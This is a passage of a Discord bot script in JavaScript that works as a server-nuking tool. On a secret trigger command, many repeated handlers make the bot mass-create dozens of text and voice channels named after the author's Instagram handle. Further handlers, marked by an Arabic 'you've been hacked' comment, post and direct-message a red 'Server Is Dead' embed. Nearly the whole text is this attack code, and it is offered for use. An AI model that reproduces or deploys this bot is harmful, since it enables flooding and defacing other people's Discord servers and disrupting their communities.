  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');


 }

});

//هنا الرسايل تم تهكيرك وكذا

client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
